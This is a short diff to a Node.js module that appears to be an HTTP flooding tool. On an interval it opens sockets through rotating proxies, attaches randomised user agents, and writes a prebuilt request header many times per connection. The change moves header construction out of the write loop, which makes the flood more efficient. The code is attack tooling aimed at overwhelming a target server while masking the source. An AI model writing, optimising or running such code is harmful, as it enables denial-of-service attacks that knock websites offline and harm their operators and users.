@@ -7,6 +7,11 @@ module.exports = {
     exec (config) {
         setInterval(() => {
             const proxyer = proxy.make()
+            const data = header.make({
+                url: config.url,
+                host: config.urls.host,
+                ua: ua.make()
+            })
             const socket = net.connect(proxyer[1], proxyer[0]);
             socket.setKeepAlive(true, config.timeout)
             socket.setTimeout(config.timeout)
@@ -21,11 +26,7 @@ module.exports = {
             });
 
             for (let j = 0; j < config.launch; j++) {
-                socket.write(header.make({
-                    url: config.url,
-                    host: config.urls.host,
-                    ua: ua.make()
-                }));
+                socket.write(data);
             }
         
             socket.on('data', () => {
